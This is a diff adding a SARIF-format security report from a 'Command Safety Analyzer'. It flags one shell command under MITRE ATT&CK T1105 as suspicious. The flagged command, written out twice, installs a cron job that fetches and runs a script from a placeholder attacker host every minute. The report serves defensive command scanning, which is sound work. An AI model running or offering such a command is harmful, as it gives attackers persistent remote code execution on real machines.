@@ -1,0 +1,66 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Command Safety Analyzer",
+          "version": "4.1",
+          "informationUri": "https://github.com/command-safety-analyzer",
+          "rules": [
+            {
+              "id": "T1105",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: download and execute (curl|sh)"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1105",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1105"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1105 (Ingress Tool Transfer)"
+              }
+            }
+          ],
+          "properties": {
+            "verdict": "SUSPICIOUS",
+            "risk_score": 25,
+            "confidence": "LOW"
+          }
+        }
+      },
+      "results": [
+        {
+          "ruleId": "T1105",
+          "level": "warning",
+          "message": {
+            "text": "命令匹配恶意模式: download and execute (curl|sh)"
+          },
+          "properties": {
+            "risk_score": 25,
+            "dimension": "静态分析",
+            "evidence": "echo '* * * * * curl http://evil.test/beacon | bash' | crontab -"
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "properties": {
+            "command": "echo '* * * * * curl http://evil.test/beacon | bash' | crontab -",
+            "verdict": "SUSPICIOUS",
+            "risk_score": 25,
+            "confidence": "LOW",
+            "timestamp": "2026-03-20T03:02:18.901502+00:00"
+          }
+        }
+      ]
+    }
+  ]
+}
